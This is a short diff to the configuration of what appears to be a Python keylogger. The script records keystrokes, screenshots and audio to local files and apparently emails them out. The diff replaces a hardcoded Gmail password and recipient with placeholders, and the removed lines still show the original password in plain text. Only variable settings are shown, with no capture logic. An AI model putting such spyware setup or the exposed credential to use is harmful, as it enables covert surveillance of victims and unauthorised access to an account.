@@ -21,11 +21,11 @@ from PIL import ImageGrab #get screen shot
 keys = []
 count = 0
 email_address = "testingcyber12@gmail.com"
-password = "m4VtiAzTdnP5GcS"
-toaddr = "testingcyber12@gmail.com"
-logkeypath = r"C:\Users\mouni\Downloads\logkeys.txt"
-screenpath=r"C:\Users\mouni\Downloads\screen.png"
-audiopath=r"C:\Users\mouni\Downloads\audioinfo.wav"
+password = "password" #example
+toaddr = "emaple@gmail.com" #example
+logkeypath = r"C:\Users\mouni\Downloads\logkeys.txt" #example
+screenpath=r"C:\Users\mouni\Downloads\screen.png"  #example
+audiopath=r"C:\Users\mouni\Downloads\audioinfo.wav"  #example
 
 currentTime = time.time()
 timecount = 6
